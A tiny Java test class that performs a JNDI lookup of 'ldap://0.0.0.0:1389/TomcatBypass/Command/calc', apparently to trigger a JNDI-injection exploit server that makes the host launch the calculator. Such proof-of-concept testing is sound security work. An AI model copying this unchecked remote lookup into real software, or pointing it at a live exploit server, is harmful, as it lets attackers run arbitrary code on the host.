package com.example.hsql;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class JNDI_Test {
    public static void main(String[] args) throws NamingException {
        InitialContext initialContext = new InitialContext();
        initialContext.lookup("ldap://0.0.0.0:1389/TomcatBypass/Command/calc");
    }
}
